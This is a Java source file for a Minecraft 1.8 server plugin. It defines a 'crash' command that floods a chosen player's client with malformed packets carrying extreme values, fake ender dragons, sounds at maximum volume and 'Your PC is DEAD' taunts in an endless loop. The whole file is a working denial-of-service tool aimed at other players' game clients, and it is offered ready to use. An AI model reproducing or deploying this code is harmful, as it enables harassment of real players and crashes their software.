package me.sirlennox.anticheatselector.command.commands;

import io.netty.buffer.Unpooled;
import me.sirlennox.anticheatselector.command.Command;
import me.sirlennox.anticheatselector.command.exceptions.CommandError;
import me.sirlennox.anticheatselector.command.exceptions.CommandUsage;
import net.minecraft.server.v1_8_R3.*;
import org.bukkit.Bukkit;
import org.bukkit.Sound;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_8_R3.CraftWorld;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import java.util.LinkedList;

public class CrashCommand extends Command {


    public CrashCommand() {
        super("crash");
    }

    @Override
    public boolean execute(CommandSender commandSender, org.bukkit.command.Command command, String label, String[] args) throws CommandUsage, CommandError {
        if(args.length < 1) throw new CommandUsage("<Player>", this);
        Player p = Bukkit.getPlayer(args[0]);
        if(p == null) throw new CommandError("Player not found!", this);
        CraftPlayer cp = (CraftPlayer) p;
        commandSender.sendMessage("§eCrashing player...");
        new Thread(() -> {
            try {
            //CrashReportDestroyer
            cp.getHandle().playerConnection.sendPacket(new PacketPlayOutCustomPayload("MC|Brand", new PacketDataSerializer(Unpooled.buffer()).a(new String(new byte[32767]))));

            //WalkSpeed/Ability-Crasher
            PlayerAbilities abilities = new PlayerAbilities();
            abilities.walkSpeed = Float.MAX_VALUE;
            abilities.flySpeed = Float.MAX_VALUE;
            abilities.canFly = false;
            abilities.canInstantlyBuild = false;
            abilities.mayBuild = false;
            cp.getHandle().playerConnection.sendPacket(new PacketPlayOutAbilities(abilities));

            while (true) {
                if(cp.getHandle() == null) {
                    commandSender.sendMessage("§aSuccessfully crashed player!");
                }

                //Title
                cp.sendTitle("§a§k+§k+§k+ §r§4Your PC is DEAD §a§k+§k+§k+", "§a§k+§k+§k+§k+§k+§k+§k+");
                cp.sendMessage("§a§k+§k+§k+ §r§aYOUR PC IS DEAD §a§k+§k+§k+");


                //EnderDragonCrasher
                EntityEnderDragon ent = new EntityEnderDragon(((CraftWorld) p.getWorld()).getHandle());
                ent.fireTicks = 1000;
                ent.setLocation(cp.getLocation().getX(), cp.getLocation().getY(), cp.getLocation().getZ(), 0, 0);
                cp.getHandle().playerConnection.sendPacket(new PacketPlayOutSpawnEntityLiving(ent));
        /*        //PaintingCrasher
                EntityPainting painting = new EntityPainting(((CraftWorld) p.getWorld()).getHandle());
                painting.fireTicks = 1000;
                painting.dead = true;
                painting.setLocation(cp.getLocation().getX(), cp.getLocation().getY(), cp.getLocation().getZ(), 0, 0);
                cp.getHandle().playerConnection.sendPacket(new PacketPlayOutSpawnEntityPainting(painting));*/

                //SoundCrasher
                cp.playSound(cp.getLocation(), Sound.BAT_DEATH, Float.MAX_VALUE, Float.MAX_VALUE);
                cp.playSound(cp.getLocation(), Sound.ENDERDRAGON_DEATH, Float.MAX_VALUE, Float.MAX_VALUE);
                cp.playSound(cp.getLocation(), Sound.ENDERMAN_DEATH, Float.MAX_VALUE, Float.MAX_VALUE);
                cp.playSound(cp.getLocation(), Sound.ENDERDRAGON_HIT, Float.MAX_VALUE, Float.MAX_VALUE);
                cp.playSound(cp.getLocation(), Sound.ENDERMAN_SCREAM, Float.MAX_VALUE, Float.MAX_VALUE);
                //Experience Crasher
                cp.getHandle().playerConnection.sendPacket(new PacketPlayOutExperience(Float.MAX_VALUE, Integer.MAX_VALUE, Integer.MAX_VALUE));

                //Rain Crasher
                cp.getHandle().playerConnection.sendPacket(new PacketPlayOutGameStateChange(7, Float.MAX_VALUE));

                //Thunder Crasher
                cp.getHandle().playerConnection.sendPacket(new PacketPlayOutGameStateChange(8, Float.MAX_VALUE));

                //Guardian Crasher
                cp.getHandle().playerConnection.sendPacket(new PacketPlayOutGameStateChange(10, 0f));

                //Explosion Crasher
                cp.getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, new LinkedList<>(), new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));


                //Demo-Help Crasher
                //Movement
                cp.getHandle().playerConnection.sendPacket(new PacketPlayOutGameStateChange(5, 101));

                //Jump
                cp.getHandle().playerConnection.sendPacket(new PacketPlayOutGameStateChange(5, 102));

                //Inventory
                cp.getHandle().playerConnection.sendPacket(new PacketPlayOutGameStateChange(5, 103));

                //DemoScreen
                cp.getHandle().playerConnection.sendPacket(new PacketPlayOutGameStateChange(5, 0));

                //SoundRepeat
                p.closeInventory();

                //EffectCrasher
                cp.getHandle().playerConnection.sendPacket(new PacketPlayOutEntityEffect(p.getEntityId(), new MobEffect(Integer.MIN_VALUE, Integer.MIN_VALUE)));


                //TeamNameCrasher
                cp.getHandle().playerConnection.sendPacket(new PacketPlayOutScoreboardTeam(new ScoreboardTeam(null, new String(new byte[16])), 0));
                cp.getHandle().playerConnection.sendPacket(new PacketPlayOutScoreboardTeam(new ScoreboardTeam(null, new String(new byte[16])), 1));

                //VelocityCrasher
                cp.getHandle().playerConnection.sendPacket(new PacketPlayOutEntityVelocity(p.getEntityId(), Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE));
            }
            } catch (NullPointerException e) {
                commandSender.sendMessage("§aSuccessfully crashed player!");
            }



            }, "Crash-Player-" + p.getName()).start();;

        return false;
    }
}
